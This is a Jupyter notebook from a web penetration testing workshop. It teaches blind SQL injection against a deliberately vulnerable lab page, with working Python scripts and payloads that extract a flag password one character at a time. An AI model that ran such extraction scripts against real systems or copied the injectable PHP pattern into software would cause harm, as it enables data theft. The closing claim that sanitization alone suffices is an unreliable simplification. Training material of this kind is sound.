{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# WORKSHOP 1: Web Penetration Testing 1\n",
    "## Part two: blind injection\n",
    "In this exercize, we'll be faced with another injection attack. This time, however, we won't be able to see the complete results of the query we make. All that the page will give us is a success or failure page. This may sound like an impenetrable barier, but it's not! With a bit of cleverness, we can't extract information just as completely as we did in part one.\n",
    "\n",
    "Let's start by looking at the page. Play around with a few different queries. What shows up when you try to register your name? What about when you try to register FLAG? (Note: no registration is actually going on here; I'll get to that in a bit)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "        <iframe\n",
       "            width=\"100%\"\n",
       "            height=\"400\"\n",
       "            src=\"http://172.16.4.60/ws1/register.php\"\n",
       "            frameborder=\"0\"\n",
       "            allowfullscreen\n",
       "        ></iframe>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.lib.display.IFrame at 0x7fd2e05f0278>"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from IPython.display import IFrame, HTML\n",
    "\n",
    "# I'm declaring URL as a global variable because the workshop\n",
    "# is located on a local IP which is subject to change.\n",
    "# Make sure you run this code first to declare the variable.\n",
    "URL = 'http://172.16.4.60/ws1/register.php'\n",
    "\n",
    "IFrame(URL, width='100%', height=400)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "Like last time, we'll look at the html to get a better idea of what's going on.\n",
    "```html\n",
    "<h2>New User Registration</h2>\n",
    "  <form action=\"register.php\" method=\"post\">\n",
    "    <label for=\"username\">Username:</label> <input type=\"username\" id=\"username\" name=\"username\"><br><br>\n",
    "    <label for=\"password\">Password:</label> <input type=\"text\" id=\"password\" name=\"password\"><br><br>\n",
    "    <button type=\"submit\">Register</button>\n",
    "  </form>\n",
    "```\n",
    "So, it's a POST query with two parameters: \"username\" and \"password\". Also like last time, I'll show you the PHP code to make this a bit easier.\n",
    "```PHP\n",
    "\\$link = mysqli_connect(\"127.0.0.1\",\"ws1register\",\"<password>\",\"workshop1\");\n",
    "\\$username = \\$_POST[\"username\"];\n",
    "\\$password = \\$_POST[\"password\"];\n",
    "\\$query = \"select * from users2 where username ='\" . \\$username . \"';\";\n",
    "\\$result = \\$link->query(\\$query);\n",
    "if (mysqli_num_rows(\\$result) == 0) {\n",
    "    echo \"<h2>OK</h2>\";\n",
    "}\n",
    "else {\n",
    "    echo \"<h2>Error: user exists</h2>\";\n",
    "}\n",
    "mysqli_close(\\$link);\n",
    "```\n",
    "(Note: the \\\\\\$ are due to issues with Jupyter code markdown and MathJax. The actual code has no backslashes)\n",
    "\n",
    "As I mentioned above, there's no actual registration going on here. In fact, the password field is completely discarded. All the code does is check if the user exist, then return OK if they do. I hope you noticed from looking at the code that this PHP is vulnerable to the same injection attack as the last part. But how can we exploit it?\n",
    "\n",
    "### Attack\n",
    "Before we move further, I'm going to introduce one more SQL concept. Here's an example statement:\n",
    "```MySQL\n",
    "SELECT * FROM users WHERE password LIKE BINARY \"pass%\";\n",
    "```\n",
    "`LIKE` is used to check for partial matches. The `%` is a wildcard: \"pass%\" will match \"password\", \"pass123\", \"password321\", and so on. The `BINARY` keyword in this case just means that the matching will be case sensitive: without this, we'll get the flag in all lowercase.\n",
    "\n",
    "In other words, this statement will find all users whose password starts with pass. Let's write some code to test this out (you should make sure you understand what the query in this code looks like before continuing. It may help to write it out):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE HTML>\n",
       "<html>\n",
       "<head>\n",
       "  <meta charset=\"UTF-8\"/>\n",
       "  <title>Color Rank</title>\n",
       "  <link rel=\"stylesheet\" href=\"style.css\">\n",
       "</head>\n",
       "<body>\n",
       "  <div class=\"header\">\n",
       "    <h1>All the colors, ranked</h1>\n",
       "    <div class=\"topbar\">\n",
       "      <a class=\"headerlink\" href=\"index.php\">Home</a>\n",
       "      <a class=\"headerlink\" href=\"register.php\">Register</a>\n",
       "      <a class=\"headerlink\" href=\"login.php\">Sign In (User)</a>\n",
       "      <a class=\"headerlink\" href=\"login-admin.php\">Sign In (Admin)</a>\n",
       "    </div>\n",
       "    <div style=\"clear:both;\"></div>\n",
       "  </div>\n",
       "  <div class=\"main\">\n",
       "    <h2>Error: user exists</h2>  </div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "# in this query, we're just checking if there are any\n",
    "# users in the database with a username starting with\n",
    "# \"FL\". This should match the flag user.\n",
    "payload = {\"username\" : \"' OR username LIKE BINARY 'FL%'; #\", \"password\" : \"blah\"}\n",
    "\n",
    "response = requests.post(URL, data=payload)\n",
    "display(HTML(response.text))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So, there exists a user whose username starts with \"FL\". This isn't really new information, because we already knew there was a user named \"FLAG\". Let's modify the code to see if we can find something interesting about this user's password:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE HTML>\n",
       "<html>\n",
       "<head>\n",
       "  <meta charset=\"UTF-8\"/>\n",
       "  <title>Color Rank</title>\n",
       "  <link rel=\"stylesheet\" href=\"style.css\">\n",
       "</head>\n",
       "<body>\n",
       "  <div class=\"header\">\n",
       "    <h1>All the colors, ranked</h1>\n",
       "    <div class=\"topbar\">\n",
       "      <a class=\"headerlink\" href=\"index.php\">Home</a>\n",
       "      <a class=\"headerlink\" href=\"register.php\">Register</a>\n",
       "      <a class=\"headerlink\" href=\"login.php\">Sign In (User)</a>\n",
       "      <a class=\"headerlink\" href=\"login-admin.php\">Sign In (Admin)</a>\n",
       "    </div>\n",
       "    <div style=\"clear:both;\"></div>\n",
       "  </div>\n",
       "  <div class=\"main\">\n",
       "    <h2>OK</h2>  </div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Notice that I'm still ignoring the password field\n",
    "payload = {\"username\" : \"FLAG' AND password LIKE BINARY 'a%'; #\", \"password\" : \"blah\"}\n",
    "\n",
    "response = requests.post(URL, data=payload)\n",
    "display(HTML(response.text))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response was \"OK\". What does this tell us? Let's look at the full query we're making:\n",
    "```MySQL\n",
    "SELECT * FROM users2 WHERE username ='FLAG' AND password LIKE BINARY 'a%'; #';\n",
    "```\n",
    "Notice that I'm not immediately escaping the intended input like we did in the previous workshop. I'm filling in the input as intended, then escaping it so I can add more stuff afterwards. In this case, I'm checking to see if there is a user named \"FLAG\" with a password which starts with a. This query fails, which tells me FLAG's password does not start with a.\n",
    "\n",
    "Let's make the code a bit easier to use and try a few more characters:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE HTML>\n",
       "<html>\n",
       "<head>\n",
       "  <meta charset=\"UTF-8\"/>\n",
       "  <title>Color Rank</title>\n",
       "  <link rel=\"stylesheet\" href=\"style.css\">\n",
       "</head>\n",
       "<body>\n",
       "  <div class=\"header\">\n",
       "    <h1>All the colors, ranked</h1>\n",
       "    <div class=\"topbar\">\n",
       "      <a class=\"headerlink\" href=\"index.php\">Home</a>\n",
       "      <a class=\"headerlink\" href=\"register.php\">Register</a>\n",
       "      <a class=\"headerlink\" href=\"login.php\">Sign In (User)</a>\n",
       "      <a class=\"headerlink\" href=\"login-admin.php\">Sign In (Admin)</a>\n",
       "    </div>\n",
       "    <div style=\"clear:both;\"></div>\n",
       "  </div>\n",
       "  <div class=\"main\">\n",
       "    <h2>OK</h2>  </div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "password_guess = \"b\"\n",
    "payload = {\"username\" : \"FLAG' AND password LIKE BINARY '\" + password_guess + \"%'; #\", \"password\" : \"blah\"}\n",
    "\n",
    "response = requests.post(URL, data=payload)\n",
    "display(HTML(response.text))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To check a different character, you can change \"password_guess\". I tried a few characters, then got bored. Why check characters manually when we can make python do it for us? Here's a loop to make our lives a little easier:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n"
     ]
    }
   ],
   "source": [
    "# Here are all the possible characters in a flag. FLAG's password is the flag,\n",
    "# so I'm not going to bother checking for other values\n",
    "possible_chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\"\n",
    "\n",
    "for char in possible_chars:\n",
    "    password_guess = char\n",
    "    payload = {\"username\" : \"FLAG' AND password LIKE BINARY '\" + password_guess + \"%'; #\", \"password\" : \"blah\"}\n",
    "\n",
    "    response = requests.post(URL, data=payload)\n",
    "    if \"Error: user exists\" in response.text:\n",
    "        print(password_guess)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This is the first time we've written any real code, so if you're new to python you should take a second to figure out what's going on here. I'm looping over every single character in the list of possible chars, checking if the password starts with that char each time. Python has a handy operator, `in`, which lets us see if the response text contains \"Error: user exists\". If it does, that means our query asking if FLAG's password starts with that character returned a result. In other words, FLAG's password does start with that character, so we should print it.\n",
    "\n",
    "Now, it's not terribly interesting just knowing that FLAG's password starts with 5. What's the next character? To find out, we can modify our code a little knowing that the password starts with 5. I only changed one line, adding \"5\" to my password guess."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5V\n"
     ]
    }
   ],
   "source": [
    "for char in possible_chars:\n",
    "    password_guess = \"5\" + char\n",
    "    payload = {\"username\" : \"FLAG' AND password LIKE BINARY '\" + password_guess + \"%'; #\", \"password\" : \"blah\"}\n",
    "\n",
    "    response = requests.post(URL, data=payload)\n",
    "    if \"Error: user exists\" in response.text:\n",
    "        print(password_guess)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you're more patient than I am, you can keep changing this code to eventually extract the whole password. Now that you know the flag starts with \"5V\", you can change the \"5\" to \"5V\", and so on.\n",
    "\n",
    "I'm not patient, though, so I'm going to wrap this whole thing in another loop and make python do that for me:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5\n",
      "5V\n",
      "5Vt\n",
      "5Vtf\n",
      "5Vtfa\n",
      "5Vtfar\n",
      "5Vtfar8\n",
      "5Vtfar8X\n",
      "5Vtfar8XJ\n",
      "5Vtfar8XJP\n",
      "5Vtfar8XJPd\n",
      "5Vtfar8XJPdx\n",
      "5Vtfar8XJPdxq\n",
      "5Vtfar8XJPdxqk\n",
      "5Vtfar8XJPdxqkh\n",
      "5Vtfar8XJPdxqkht\n"
     ]
    }
   ],
   "source": [
    "# We'll start with a blank password guess\n",
    "password_guess = \"\"\n",
    "\n",
    "# python doesn't have \"do while\" loops like C,\n",
    "# so I'm doing this with \"while True\"\n",
    "while True:\n",
    "    new_character = False\n",
    "    for char in possible_chars:\n",
    "        # Our query will be what we know (password_guess)\n",
    "        # plus what we think might be next (char)\n",
    "        payload = {\"username\" : \"FLAG' AND password LIKE BINARY '\" + password_guess + char + \"%'; #\", \"password\" : \"blah\"}\n",
    "        \n",
    "        response = requests.post(URL, data=payload)\n",
    "        if \"Error: user exists\" in response.text:\n",
    "            # Update password_guess, because we know it includes char\n",
    "            password_guess = password_guess + char\n",
    "            print(password_guess)\n",
    "            new_character = True\n",
    "    \n",
    "    # If we don't find a new character through the entire while loop,\n",
    "    # the password can't be any longer. So we exit the loop by using\n",
    "    # the \"break\" keyword\n",
    "    if not new_character:\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Great! As you can see, even without being able to see the results of our query directly we can extract everything we need. Remember, to protect against this attack all you need to do is input sanitization. "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
